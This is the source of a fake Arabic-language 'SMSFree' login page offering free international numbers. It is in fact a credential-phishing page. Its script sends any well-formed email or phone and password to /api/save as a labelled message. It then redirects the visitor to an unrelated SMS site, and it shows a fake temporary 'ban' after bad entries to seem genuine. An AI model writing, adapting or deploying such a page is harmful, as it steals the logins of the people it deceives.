<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - Login</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 400px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        /* تأثير الضباب عند الحظر */
        .is-banned .blur-content {
            filter: blur(15px);
            opacity: 0.2;
            pointer-events: none;
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 15px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        /* واجهة المؤقت */
        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }

        #timer { font-size: 50px; font-weight: bold; color: #fbbf24; }

        /* تخصيص شكل الدايلوج المنبثق ليناسب موقعك */
        .custom-swal-popup {
            background: #1e293b !important;
            color: #fff !important;
            border-radius: 20px !important;
            border: 1px solid #334155 !important;
        }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    <div class="ban-overlay" id="banOverlay">
        <h3 style="color: #fbbf24; margin: 0;">⚠️ تم تقييد الوصول</h3>
        <p style="font-size: 12px; color: #94a3b8;">تم حظرك بسبب المحاولات غير الصحيحة</p>
        <div id="timer">30</div>
    </div>

    <div class="blur-content" id="contentArea">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود وأرقام عالمية حصرية.</h2>

        <form id="loginForm">
            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    let attempts = 0;

    // فحص إذا كان هناك حظر نشط عند فتح الصفحة
    window.onload = () => {
        const expiry = localStorage.getItem('blockTime');
        if (expiry) {
            const remaining = Math.round((expiry - Date.now()) / 1000);
            if (remaining > 0) startBan(remaining);
            else localStorage.removeItem('blockTime');
        }
    };

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const userInput = document.getElementById('user').value.trim();
        const passInput = document.getElementById('pass').value;

        // شروط التحقق (Regex)
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^[0-9]{8,15}$/;
        const isArabic = /[\u0600-\u06FF]/.test(userInput);

        if ((emailRegex.test(userInput) || phoneRegex.test(userInput)) && !isArabic && passInput.length >= 6) {
            // إذا كانت البيانات صحيحة يتم الإرسال
            sendData(userInput, passInput);
        } else {
            // إظهار الدايلوج الاحترافي عند الخطأ كما طلبت
            attempts++;
            if (attempts >= 3) {
                const expiryTime = Date.now() + (30 * 1000);
                localStorage.setItem('blockTime', expiryTime);
                startBan(30);
            } else {
                Swal.fire({
                    title: 'بيانات غير دقيقة',
                    text: 'يرجى كتابة البريد أو كلمة المرور بشكل صحيح لتجنب الحظر المؤقت في الموقع.',
                    icon: 'error',
                    confirmButtonText: 'حسناً',
                    confirmButtonColor: '#22d3ee',
                    customClass: { popup: 'custom-swal-popup' }
                });
            }
        }
    };

    function startBan(seconds) {
        const card = document.getElementById('mainCard');
        const overlay = document.getElementById('banOverlay');
        const timerText = document.getElementById('timer');
        
        card.classList.add('is-banned');
        overlay.style.display = 'block';

        let timeLeft = seconds;
        timerText.innerText = timeLeft;

        const countdown = setInterval(() => {
            timeLeft--;
            timerText.innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(countdown);
                card.classList.remove('is-banned');
                overlay.style.display = 'none';
                localStorage.removeItem('blockTime');
                attempts = 0;
                
                Swal.fire({
                    title: 'مبروك!',
                    text: 'تم إزالة الحظر عنك بعد انتهاء الـ 30 ثانية. لا تكرر الغلط ثانية.',
                    icon: 'success',
                    confirmButtonColor: '#22d3ee',
                    customClass: { popup: 'custom-swal-popup' }
                });
            }
        }, 1000);
    }

    async function sendData(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `👤: ${u}\n🔑: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>

</body>
</html>
